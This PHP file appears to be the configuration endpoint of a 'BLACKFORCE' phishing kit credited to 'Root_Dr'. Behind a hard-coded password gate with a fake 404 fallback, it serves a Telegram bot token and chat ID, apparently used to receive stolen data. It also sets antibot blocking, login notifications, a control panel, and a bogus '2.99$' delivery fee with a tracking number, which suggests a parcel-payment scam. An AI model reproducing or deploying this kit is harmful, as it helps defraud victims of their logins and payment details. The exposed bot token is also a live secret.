<?php
/*
  ____  _        _    ____ _  _______ ___  ____   ____ _____ 
 | __ )| |      / \  / ___| |/ /  ___/ _ \|  _ \ / ___| ____|
 |  _ \| |     / _ \| |   | ' /| |_ | | | | |_) | |   |  _|  
 | |_) | |___ / ___ \ |___| . \|  _|| |_| |  _ <| |___| |___ 
 |____/|_____/_/   \_\____|_|\_\_|   \___/|_| \_\\____|_____|
 Coded By Root_Dr
DM:@Root_Dr                                                              
*/
require_once "../cors.php";

if (isset($_GET['PWD']) && $_GET['PWD'] === 'BLACKFORCE') {

  $config = [
    /* TeLegram Token & chatid */
    'TOKEN' => '7328130141:AAGPZS-pBXqfdWigygH-_IP5Z77f5t4nJqY',
    'CHATID' => '-1002255215041',

    /* Antibots Blocker => true / false */
    'ANTIBOTS' => true,

    /* Antibots Blocker => true / false */
    'PHONE' => false,

    /* TeLegram Notif => true / false */
    'NOTIF' => false,
    'NOTIF_LOGIN' => true,

    /* Panel Control => true / false */
    'PANEL' => true,

    /* Info's Page => true / false */
    'INFOZ_PAGE' => true,
    'INFO_NOTIF' => true,

    'PRICE' => '2.99$',
    'TRACKING' => '9555648992661',
  ];

  echo json_encode($config);
} else {

  http_response_code(404);
  header('Content-Type: text/plain; charset=utf-8');
  die('404 Not Found: The page you are looking for does not exist.');
}
